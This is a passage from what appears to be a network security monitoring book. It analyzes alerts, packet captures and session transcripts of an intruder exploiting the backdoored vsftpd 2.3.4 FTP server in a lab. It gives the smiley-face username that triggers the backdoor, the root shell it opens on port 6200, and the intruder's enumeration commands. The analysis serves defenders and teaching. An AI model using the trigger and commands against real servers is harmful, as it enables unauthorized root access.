  id: totrans-1241
  prefs: []
  type: TYPE_NORMAL
- en: '***Returning to Alert Data***'
  id: totrans-1242
  prefs: []
  type: TYPE_NORMAL
- en: Let’s examine two alerts in the Sguil console. As shown in Figure 10-9, we
  id: totrans-1243
  prefs: []
  type: TYPE_NORMAL
- en: see two worrisome alerts titled GPL ATTACK_RESPONSE id check returned root
  id: totrans-1244
  prefs: []
  type: TYPE_NORMAL
- en: and ET EXPLOIT VSFTPD Backdoor User Login Smiley. There is also an odd alert
  id: totrans-1245
  prefs: []
  type: TYPE_NORMAL
- en: with the title PADS New Asset - sql MySQL 3.0.20-0.1ubuntu1, and then two
  id: totrans-1246
  prefs: []
  type: TYPE_NORMAL
- en: ICMP alerts.
  id: totrans-1247
  prefs: []
  type: TYPE_NORMAL
- en: '**214** Chapter 10'
  id: totrans-1248
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1249
  prefs: []
  type: TYPE_NORMAL
- en: '![Image 129](index-249_1.png)'
  id: totrans-1250
  prefs: []
  type: TYPE_IMG
- en: '![Image 130](index-249_2.png)'
  id: totrans-1251
  prefs: []
  type: TYPE_IMG
- en: '*Figure 10-8: Reconnaissance phase 5 ends, and the intruder at acks a victim.*'
  id: totrans-1252
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-9: Snort alert data fol owing reconnaissance alerts*'
  id: totrans-1253
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **215**
  id: totrans-1254
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1255
  prefs: []
  type: TYPE_NORMAL
- en: 'I’ve highlighted the record for the ET EXPLOIT alert because it appears to
    be the most straightforward one, and it uses a fairly familiar protocol: FTP.'
  id: totrans-1256
  prefs: []
  type: TYPE_NORMAL
- en: Sguil’s Show Packet Data option reveals that the username supplied to the
  id: totrans-1257
  prefs: []
  type: TYPE_NORMAL
- en: FTP server is 0M:), followed by a carriage return (0D) and line feed (0A). (FTP
  id: totrans-1258
  prefs: []
  type: TYPE_NORMAL
- en: ends commands with these characters, meaning they were transmitted by
  id: totrans-1259
  prefs: []
  type: TYPE_NORMAL
- en: the FTP client when the user (or attack tool) entered the FTP username.)
  id: totrans-1260
  prefs: []
  type: TYPE_NORMAL
- en: We can try to generate a transcript for this event by right-clicking the
  id: totrans-1261
  prefs: []
  type: TYPE_NORMAL
- en: Alert ID field and selecting **Transcript**. The result is shown in Listing
    10-2\.
  id: totrans-1262
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1-1'
  id: totrans-1263
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-09 21:38:38'
  id: totrans-1264
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1-1_6011'
  id: totrans-1265
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 203.0.113.10u (Unknown)'
  id: totrans-1266
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 192.168.3.5x (Unknown)'
  id: totrans-1267
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 50376'
  id: totrans-1268
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 21w'
  id: totrans-1269
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 203.0.113.10:50376 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]
    (up: 1 hrs) OS Fingerprint: -> 192.168.3.5:21 (link: ethernet/modem)'
  id: totrans-1270
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 220 (vsFTPd 2.3.4)v'
  id: totrans-1271
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-1272
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: USER 0M:)y'
  id: totrans-1273
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-1274
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 331 Please specify the password.'
  id: totrans-1275
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-1276
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: PASS azzz'
  id: totrans-1277
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC:'
  id: totrans-1278
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 421 Timeout.{'
  id: totrans-1279
  prefs: []
  type: TYPE_NORMAL
- en: 'DST:'
  id: totrans-1280
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-2: Transcript of ET EXPLOIT Alert*'
  id: totrans-1281
  prefs: []
  type: TYPE_NORMAL
- en: This transcript shows 203.0.113.10 u logging in to the FTP server v on
  id: totrans-1282
  prefs: []
  type: TYPE_NORMAL
- en: port 21 TCP w on 192.168.3.5 x. The username is 0M:) y, as noted earlier
  id: totrans-1283
  prefs: []
  type: TYPE_NORMAL
- en: by the Snort alert. The client provides a password of azz z, but no commu-
  id: totrans-1284
  prefs: []
  type: TYPE_NORMAL
- en: nication takes place {. What happened next, and what about the connection
  id: totrans-1285
  prefs: []
  type: TYPE_NORMAL
- en: involving port 6200 TCP?
  id: totrans-1286
  prefs: []
  type: TYPE_NORMAL
- en: '***Reviewing Full Content Data with Tshark***'
  id: totrans-1287
  prefs: []
  type: TYPE_NORMAL
- en: In situations like this, I recommend examining the original traffic as
  id: totrans-1288
  prefs: []
  type: TYPE_NORMAL
- en: recorded by the full content data. We’re interested in traffic occurring at
  id: totrans-1289
  prefs: []
  type: TYPE_NORMAL
- en: the 2013-03-09 21:38:38 timestamp involving port 21 or 6200 TCP. We can
  id: totrans-1290
  prefs: []
  type: TYPE_NORMAL
- en: read the full content data by looking in the appropriate directory on the
  id: totrans-1291
  prefs: []
  type: TYPE_NORMAL
- en: sensor named sovm and by watching the eth1 interface. We run the ls com-
  id: totrans-1292
  prefs: []
  type: TYPE_NORMAL
- en: mand to see the name of the full content file available for review, as shown
  id: totrans-1293
  prefs: []
  type: TYPE_NORMAL
- en: in Listing 10-3\.
  id: totrans-1294
  prefs: []
  type: TYPE_NORMAL
- en: '**216** Chapter 10'
  id: totrans-1295
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1296
  prefs: []
  type: TYPE_NORMAL
- en: $ **cd /nsm/sensor_data/sovm-eth1/dailylogs/2013-03-09**
  id: totrans-1297
  prefs: []
  type: TYPE_NORMAL
- en: $ **ls**
  id: totrans-1298
  prefs: []
  type: TYPE_NORMAL
- en: snort.log.1362864654
  id: totrans-1299
  prefs: []
  type: TYPE_NORMAL
- en: $ **tshark -n -t ad -r snort.log.1362864654 tcp.port==21 or tcp.port==6200**
  id: totrans-1300
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-3: Finding the full content data and running Tshark*'
  id: totrans-1301
  prefs: []
  type: TYPE_NORMAL
- en: We use Tshark because, by default, it displays more protocol-level details,
  id: totrans-1302
  prefs: []
  type: TYPE_NORMAL
- en: making it easier to follow what’s happening. Now we’ll look at each relevant
  id: totrans-1303
  prefs: []
  type: TYPE_NORMAL
- en: part of these details, section by section. (We begin by ignoring traffic asso-
  id: totrans-1304
  prefs: []
  type: TYPE_NORMAL
- en: ciated with reconnaissance.)
  id: totrans-1305
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-4 shows the first two packets of interest.
  id: totrans-1306
  prefs: []
  type: TYPE_NORMAL
- en: 6589 2013-03-09 21:38:38.159255 203.0.113.10u -> 192.168.3.5w
  id: totrans-1307
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 40206 > 6200v [SYN] Seq=0 Win=14600 Len=0 MSS=1460
  id: totrans-1308
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=695390 TSecr=0 WS=16
  id: totrans-1309
  prefs: []
  type: TYPE_NORMAL
- en: 6590 2013-03-09 21:38:38.159451 192.168.3.5 -> 203.0.113.10
  id: totrans-1310
  prefs: []
  type: TYPE_NORMAL
- en: TCP 60 6200 > 40206 [RST, ACK]x Seq=1 Ack=1 Win=0 Len=0
  id: totrans-1311
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-4: 203.0.113.10 tries to connect to port 6200 TCP on 192.168.3.5
    but fails.*'
  id: totrans-1312
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 10-4, 203.0.113.10 u is trying to connect to port 6200 TCP v
  id: totrans-1313
  prefs: []
  type: TYPE_NORMAL
- en: on 192.168.3.5 w, but the connection fails because port 6200 TCP is not lis-
  id: totrans-1314
  prefs: []
  type: TYPE_NORMAL
- en: tening. It replies with RST, ACK x.
  id: totrans-1315
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-5 shows what happens next.
  id: totrans-1316
  prefs: []
  type: TYPE_NORMAL
- en: 6591 2013-03-09 21:38:38.160692 203.0.113.10u -> 192.168.3.5w
  id: totrans-1317
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 50376 > 21v [SYN] Seq=0 Win=14600 Len=0 MSS=1460
  id: totrans-1318
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=695390 TSecr=0 WS=16
  id: totrans-1319
  prefs: []
  type: TYPE_NORMAL
- en: 6592 2013-03-09 21:38:38.160702 192.168.3.5 -> 203.0.113.10
  id: totrans-1320
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 21 > 50376 [SYN, ACK] Seq=0 Ack=1 Win=5792 Len=0 MSS=1460
  id: totrans-1321
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=276175 TSecr=695390 WS=32
  id: totrans-1322
  prefs: []
  type: TYPE_NORMAL
- en: 6593 2013-03-09 21:38:38.161131 203.0.113.10 -> 192.168.3.5
  id: totrans-1323
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 50376 > 21 [ACK] Seq=1 Ack=1 Win=14608 Len=0 TSval=695390 TSecr=276175
  id: totrans-1324
  prefs: []
  type: TYPE_NORMAL
- en: 6594 2013-03-09 21:38:38.162679 192.168.3.5 -> 203.0.113.10
  id: totrans-1325
  prefs: []
  type: TYPE_NORMAL
- en: 'FTP 86 Response: 220 (vsFTPd 2.3.4)'
  id: totrans-1326
  prefs: []
  type: TYPE_NORMAL
- en: 6595 2013-03-09 21:38:38.163164 203.0.113.10 -> 192.168.3.5
  id: totrans-1327
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 50376 > 21 [ACK] Seq=1 Ack=21 Win=14608 Len=0 TSval=695391 TSecr=276175
  id: totrans-1328
  prefs: []
  type: TYPE_NORMAL
- en: 6596 2013-03-09 21:38:38.164876 203.0.113.10 -> 192.168.3.5
  id: totrans-1329
  prefs: []
  type: TYPE_NORMAL
- en: 'FTP 77 Request: USER 0M:)x'
  id: totrans-1330
  prefs: []
  type: TYPE_NORMAL
- en: 6597 2013-03-09 21:38:38.164886 192.168.3.5 -> 203.0.113.10
  id: totrans-1331
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 21 > 50376 [ACK] Seq=21 Ack=12 Win=5792 Len=0 TSval=276175 TSecr=695391
  id: totrans-1332
  prefs: []
  type: TYPE_NORMAL
- en: 6598 2013-03-09 21:38:38.164888 192.168.3.5 -> 203.0.113.10
  id: totrans-1333
  prefs: []
  type: TYPE_NORMAL
- en: 'FTP 100 Response: 331 Please specify the password.'
  id: totrans-1334
  prefs: []
  type: TYPE_NORMAL
- en: 6599 2013-03-09 21:38:38.166318 203.0.113.10 -> 192.168.3.5
  id: totrans-1335
  prefs: []
  type: TYPE_NORMAL
- en: 'FTP 76 Request: PASS azzy'
  id: totrans-1336
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-5: 203.0.113.10 logs in to the FTP server at 192.168.3.5\.*'
  id: totrans-1337
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **217**
  id: totrans-1338
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1339
  prefs: []
  type: TYPE_NORMAL
- en: In Listing 10-5, we see that 203.0.113.10 u connects to the FTP service on port
    21 TCP v on 192.168.3.5 w. We also see user 0M:) x log in and
  id: totrans-1340
  prefs: []
  type: TYPE_NORMAL
- en: provide the password azz y. Listing 10-6 shows the consequence of the suc-
  id: totrans-1341
  prefs: []
  type: TYPE_NORMAL
- en: cessful login.
  id: totrans-1342
  prefs: []
  type: TYPE_NORMAL
- en: 6600 2013-03-09 21:38:38.166971 203.0.113.10u -> 192.168.3.5w
  id: totrans-1343
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 60155 > 6200v [SYN] Seq=0 Win=14600 Len=0 MSS=1460
  id: totrans-1344
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=695392 TSecr=0 WS=16
  id: totrans-1345
  prefs: []
  type: TYPE_NORMAL
- en: 6601 2013-03-09 21:38:38.166978 192.168.3.5 -> 203.0.113.10
  id: totrans-1346
  prefs: []
  type: TYPE_NORMAL
- en: TCP 74 6200 > 60155 [SYN, ACK]x Seq=0 Ack=1 Win=5792 Len=0 MSS=1460
  id: totrans-1347
  prefs: []
  type: TYPE_NORMAL
- en: SACK_PERM=1 TSval=276175 TSecr=695392 WS=32
  id: totrans-1348
  prefs: []
  type: TYPE_NORMAL
- en: 6602 2013-03-09 21:38:38.168296 203.0.113.10 -> 192.168.3.5
  id: totrans-1349
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 60155 > 6200 [ACK] Seq=1 Ack=1 Win=14608 Len=0 TSval=695392 TSecr=276175
  id: totrans-1350
  prefs: []
  type: TYPE_NORMAL
- en: 6603 2013-03-09 21:38:38.168738 203.0.113.10 -> 192.168.3.5
  id: totrans-1351
  prefs: []
  type: TYPE_NORMAL
- en: TCP 69 60155 > 6200 [PSH, ACK] Seq=1 Ack=1 Win=14608 Len=3 TSval=695392 TSecr=276175
  id: totrans-1352
  prefs: []
  type: TYPE_NORMAL
- en: 6604 2013-03-09 21:38:38.168775 192.168.3.5 -> 203.0.113.10
  id: totrans-1353
  prefs: []
  type: TYPE_NORMAL
- en: TCP 66 6200 > 60155 [ACK] Seq=1 Ack=4 Win=5792 Len=0 TSval=276175 TSecr=695392
  id: totrans-1354
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  id: totrans-1355
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-6: 203.0.113.10 connects to port 6200 TCP on 192.168.3.5\.*'
  id: totrans-1356
  prefs: []
  type: TYPE_NORMAL
- en: Immediately, before tearing down the connection to the FTP server,
  id: totrans-1357
  prefs: []
  type: TYPE_NORMAL
- en: we see a new connection from 203.0.113.10 u to port 6200 TCP v on
  id: totrans-1358
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5 w. This time, unlike in Listing 10-4, port 6200 TCP is listen-
  id: totrans-1359
  prefs: []
  type: TYPE_NORMAL
- en: ing, and it accepts the connection by replying with SYN, ACK x.
  id: totrans-1360
  prefs: []
  type: TYPE_NORMAL
- en: This sequence of events shows that port 6200 TCP was not actively accept-
  id: totrans-1361
  prefs: []
  type: TYPE_NORMAL
- en: ing connections until 203.0.113.10 logged in to the FTP server and provided
  id: totrans-1362
  prefs: []
  type: TYPE_NORMAL
- en: the proper username and password.
  id: totrans-1363
  prefs: []
  type: TYPE_NORMAL
- en: '***Understanding the Backdoor***'
  id: totrans-1364
  prefs: []
  type: TYPE_NORMAL
- en: This pattern indicates that the FTP server at 192.168.3.5 was coded with a
  id: totrans-1365
  prefs: []
  type: TYPE_NORMAL
- en: backdoor watching for a certain username and password. In our case, we
  id: totrans-1366
  prefs: []
  type: TYPE_NORMAL
- en: saw user 0M:) and password azz.
  id: totrans-1367
  prefs: []
  type: TYPE_NORMAL
- en: It turns out that 192.168.3.5 was running a version of the vsftpd FTP
  id: totrans-1368
  prefs: []
  type: TYPE_NORMAL
- en: server that contained an unauthorized backdoor, as reported in July 2011
  id: totrans-1369
  prefs: []
  type: TYPE_NORMAL
- en: by vsftpd developer Chris Evans ( *http://scarybeastsecurity.blogspot.com/2011/07/*
  id: totrans-1370
  prefs: []
  type: TYPE_NORMAL
- en: '*alert-vsftpd-download-backdoored.html*). No details on how the code was'
  id: totrans-1371
  prefs: []
  type: TYPE_NORMAL
- en: backdoored appear in the blog post, but the net effect was availability of
  id: totrans-1372
  prefs: []
  type: TYPE_NORMAL
- en: software that contained a serious security flaw. Users who enter a username
  id: totrans-1373
  prefs: []
  type: TYPE_NORMAL
- en: ending in a smiley face (like :)) will enjoy the ability to connect to a back-
  id: totrans-1374
  prefs: []
  type: TYPE_NORMAL
- en: door on the FTP server. Figure 10-10 summarizes the situation and adds
  id: totrans-1375
  prefs: []
  type: TYPE_NORMAL
- en: specific details for this case.
  id: totrans-1376
  prefs: []
  type: TYPE_NORMAL
- en: Why did the logs show records involving port 6200 TCP before the suc-
  id: totrans-1377
  prefs: []
  type: TYPE_NORMAL
- en: cessful exploitation of the FTP server? As we saw in the full content data
  id: totrans-1378
  prefs: []
  type: TYPE_NORMAL
- en: rendered by Tshark, the FTP connection happened before the backdoor
  id: totrans-1379
  prefs: []
  type: TYPE_NORMAL
- en: connection. Apparently, the tools used to log the alert and session data
  id: totrans-1380
  prefs: []
  type: TYPE_NORMAL
- en: couldn’t differentiate between the start times for these connections, and
  id: totrans-1381
  prefs: []
  type: TYPE_NORMAL
- en: '**218** Chapter 10'
  id: totrans-1382
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1383
  prefs: []
  type: TYPE_NORMAL
- en: they logged them out of order. This happens occasionally when performing NSM.
    This phenomenon helps support the idea of collecting multiple NSM
  id: totrans-1384
  prefs: []
  type: TYPE_NORMAL
- en: datatypes. When something doesn’t look quite right, you can compare dif-
  id: totrans-1385
  prefs: []
  type: TYPE_NORMAL
- en: ferent datatypes to better determine what really happened.
  id: totrans-1386
  prefs: []
  type: TYPE_NORMAL
- en: 1\. Intruder initiates attack against exposed,
  id: totrans-1387
  prefs: []
  type: TYPE_NORMAL
- en: vulnerable application on victim system.
  id: totrans-1388
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION to port 21 TCP
  id: totrans-1389
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  id: totrans-1390
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-1391
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  id: totrans-1392
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  id: totrans-1393
  prefs: []
  type: TYPE_NORMAL
- en: 2\. Attack method exploits vulnerable application
  id: totrans-1394
  prefs: []
  type: TYPE_NORMAL
- en: on victim system to execute code or commands.
  id: totrans-1395
  prefs: []
  type: TYPE_NORMAL
- en: vsftpd
  id: totrans-1396
  prefs: []
  type: TYPE_NORMAL
- en: Exploited
  id: totrans-1397
  prefs: []
  type: TYPE_NORMAL
- en: user 0M:)
  id: totrans-1398
  prefs: []
  type: TYPE_NORMAL
- en: pass azz
  id: totrans-1399
  prefs: []
  type: TYPE_NORMAL
- en: NETWORK CONNECTION to port 6200 TCP
  id: totrans-1400
  prefs: []
  type: TYPE_NORMAL
- en: Intruder
  id: totrans-1401
  prefs: []
  type: TYPE_NORMAL
- en: Victim
  id: totrans-1402
  prefs: []
  type: TYPE_NORMAL
- en: 203.0.113.10
  id: totrans-1403
  prefs: []
  type: TYPE_NORMAL
- en: 192.168.3.5
  id: totrans-1404
  prefs: []
  type: TYPE_NORMAL
- en: '3\. Malicious code interacts with intruder:'
  id: totrans-1405
  prefs: []
  type: TYPE_NORMAL
- en: Intruder initiates new connection to
  id: totrans-1406
  prefs: []
  type: TYPE_NORMAL
- en: backdoor created by malicious code.
  id: totrans-1407
  prefs: []
  type: TYPE_NORMAL
- en: '*Figure 10-10: Server-side at ack involving exploitation of vulnerable vsftpd
    server*'
  id: totrans-1408
  prefs: []
  type: TYPE_NORMAL
- en: '***What Did the Intruder Do?***'
  id: totrans-1409
  prefs: []
  type: TYPE_NORMAL
- en: Having confirmed that a malicious act took place, we need to understand
  id: totrans-1410
  prefs: []
  type: TYPE_NORMAL
- en: its impact. This scenario appears to be at least a Breach 3 incident, because
  id: totrans-1411
  prefs: []
  type: TYPE_NORMAL
- en: an intruder has established a C2 channel from his computer to the victim.
  id: totrans-1412
  prefs: []
  type: TYPE_NORMAL
- en: How can we find out how bad things are?
  id: totrans-1413
  prefs: []
  type: TYPE_NORMAL
- en: We’ve seen a GPL ATTACK_RESPONSE alert indicating id check returned root.
  id: totrans-1414
  prefs: []
  type: TYPE_NORMAL
- en: We also know that port 6200 TCP is the C2 channel. We might be able to
  id: totrans-1415
  prefs: []
  type: TYPE_NORMAL
- en: learn what the intruder is doing by generating a transcript for this connec-
  id: totrans-1416
  prefs: []
  type: TYPE_NORMAL
- en: tion, either through the GPL ATTACK_RESPONSE alert or by using the session
  id: totrans-1417
  prefs: []
  type: TYPE_NORMAL
- en: data from 203.0.113.10 to port 6200 TCP on 192.168.3.5\. We can examine
  id: totrans-1418
  prefs: []
  type: TYPE_NORMAL
- en: the contents of that session in detail by generating a transcript, as you’ll
    see
  id: totrans-1419
  prefs: []
  type: TYPE_NORMAL
- en: in the following section. This examination should give us a better sense of
  id: totrans-1420
  prefs: []
  type: TYPE_NORMAL
- en: what the intruder is doing.
  id: totrans-1421
  prefs: []
  type: TYPE_NORMAL
- en: '**Initial access**'
  id: totrans-1422
  prefs: []
  type: TYPE_NORMAL
- en: The transcript for activity from 203.0.113.10 to 192.168.3.5, shown in
  id: totrans-1423
  prefs: []
  type: TYPE_NORMAL
- en: Listing 10-7, shows a variety of events. We can’t be sure if an intruder is
  id: totrans-1424
  prefs: []
  type: TYPE_NORMAL
- en: interacting with the system in a live manner or if he is executing an auto-
  id: totrans-1425
  prefs: []
  type: TYPE_NORMAL
- en: mated attack. What matters, though, are the consequences of the activities.
  id: totrans-1426
  prefs: []
  type: TYPE_NORMAL
- en: Server-side Compromise **219**
  id: totrans-1427
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1428
  prefs: []
  type: TYPE_NORMAL
- en: 'Sensor Name: sovm-eth1-1'
  id: totrans-1429
  prefs: []
  type: TYPE_NORMAL
- en: 'Timestamp: 2013-03-09 21:38:38'
  id: totrans-1430
  prefs: []
  type: TYPE_NORMAL
- en: 'Connection ID: .sovm-eth1-1_6012'
  id: totrans-1431
  prefs: []
  type: TYPE_NORMAL
- en: 'Src IP: 203.0.113.10u (Unknown)'
  id: totrans-1432
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst IP: 192.168.3.5v (Unknown)'
  id: totrans-1433
  prefs: []
  type: TYPE_NORMAL
- en: 'Src Port: 60155'
  id: totrans-1434
  prefs: []
  type: TYPE_NORMAL
- en: 'Dst Port: 6200'
  id: totrans-1435
  prefs: []
  type: TYPE_NORMAL
- en: 'OS Fingerprint: 203.0.113.10:60155 - UNKNOWN [S10:63:1:60:M1460,S,T,N,W4:.:?:?]
    (up: 1 hrs) OS Fingerprint: -> 192.168.3.5:6200 (link: ethernet/modem)'
  id: totrans-1436
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: idw'
  id: totrans-1437
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: uid=0(root) gid=0(root) x'
  id: totrans-1438
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: nohup >/dev/null 2>&1'
  id: totrans-1439
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: echo T33KwxKuFgj4Uhy7'
  id: totrans-1440
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: T33KwxKuFgj4Uhy7'
  id: totrans-1441
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: whoamiy'
  id: totrans-1442
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: rootz'
  id: totrans-1443
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: echo 3816568630;echo hJZeerbzDFqlJEwWxlyePwOzBhEhQYbN'
  id: totrans-1444
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 3816568630'
  id: totrans-1445
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: hJZeerbzDFqlJEwWxlyePwOzBhEhQYbN'
  id: totrans-1446
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: id -u{ ;echo idGIIxVuiPbrznIwlhwdADqMpAAyLIlj}'
  id: totrans-1447
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 0|'
  id: totrans-1448
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: idGIIxVuiPbrznIwlhwdADqMpAAyLIlj'
  id: totrans-1449
  prefs: []
  type: TYPE_NORMAL
- en: '*Listing 10-7: The beginning of the transcript showing activity from 203.0.113.10
    to 192.168.3.5*'
  id: totrans-1450
  prefs: []
  type: TYPE_NORMAL
- en: The first part of the transcript shows 203.0.113.10 u as the source (SRC)
  id: totrans-1451
  prefs: []
  type: TYPE_NORMAL
- en: IP address, and 192.168.3.5 v as the destination (DST) IP address. The
  id: totrans-1452
  prefs: []
  type: TYPE_NORMAL
- en: intruder, or code executed by the intruder, runs the Unix id command w
  id: totrans-1453
  prefs: []
  type: TYPE_NORMAL
- en: to determine the privileges that the channel currently provides. The result
  id: totrans-1454
  prefs: []
  type: TYPE_NORMAL
- en: indicates that this is a root-level account x. We see confirmation of the user
  id: totrans-1455
  prefs: []
  type: TYPE_NORMAL
- en: 'account with the whoami command y and its corresponding result: root z.'
  id: totrans-1456
  prefs: []
  type: TYPE_NORMAL
- en: Now, using the id command with the -u switch {, the intruder sees the effec-
  id: totrans-1457
  prefs: []
  type: TYPE_NORMAL
- en: tive user ID of 0 |, which is again associated with root access. The intruder
  id: totrans-1458
  prefs: []
  type: TYPE_NORMAL
- en: or his script appears to be using echo statements with long strings } to mark
  id: totrans-1459
  prefs: []
  type: TYPE_NORMAL
- en: certain places in the flow of activity on the system.
  id: totrans-1460
  prefs: []
  type: TYPE_NORMAL
- en: '**Enumerating the Victim**'
  id: totrans-1461
  prefs: []
  type: TYPE_NORMAL
- en: The transcript continues as shown in Listing 10-8\. After running some basic
  id: totrans-1462
  prefs: []
  type: TYPE_NORMAL
- en: commands, the intruder spends more time learning about the victim.
  id: totrans-1463
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: /usr/sbin/dmidecodeu ;echo WqyRBNDvoqzwtPMOWXAZNDHVcqKrjVOA'
  id: totrans-1464
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: # dmidecode 2.9'
  id: totrans-1465
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: SMBIOS 2.4 present.'
  id: totrans-1466
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: 364 structures occupying 16040 bytes.'
  id: totrans-1467
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Table at 0x000E0010\.'
  id: totrans-1468
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  id: totrans-1469
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Handle 0x016B, DMI type 127, 4 bytes'
  id: totrans-1470
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: End Of Table'
  id: totrans-1471
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: WqyRBNDvoqzwtPMOWXAZNDHVcqKrjVOA'
  id: totrans-1472
  prefs: []
  type: TYPE_NORMAL
- en: '**220** Chapter 10'
  id: totrans-1473
  prefs: []
  type: TYPE_NORMAL
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-1474
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: ls /etcv ;echo PZhfAinSgdJcyhYaCgAcFDjvciEFALXs'
  id: totrans-1475
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: X11'
  id: totrans-1476
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: adduser.conf'
  id: totrans-1477
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: adjtime'
  id: totrans-1478
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: aliases'
  id: totrans-1479
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: aliases.db'
  id: totrans-1480
  prefs: []
  type: TYPE_NORMAL
- en: '*-- snip --*'
  id: totrans-1481
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: wgetrc'
  id: totrans-1482
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: wpa_supplicant'
  id: totrans-1483
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xinetd.conf'
  id: totrans-1484
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: xinetd.d'
  id: totrans-1485
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: zsh_command_not_found'
  id: totrans-1486
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: PZhfAinSgdJcyhYaCgAcFDjvciEFALXs'
  id: totrans-1487
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: uname -aw ;echo gSQsJbnmNmNLEqElLTNRfxfLUQNndGaS'
  id: totrans-1488
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008'
  id: totrans-1489
  prefs: []
  type: TYPE_NORMAL
- en: i686 GNU/Linuxx
  id: totrans-1490
  prefs: []
  type: TYPE_NORMAL
- en: 'DST: gSQsJbnmNmNLEqElLTNRfxfLUQNndGaS'
  id: totrans-1491
  prefs: []
  type: TYPE_NORMAL
- en: 'SRC: cat ''/etc/issue''y;echo KoDdtYNGyWHGPIkHITZtMAYrhsyckIIC'
  id: totrans-1492
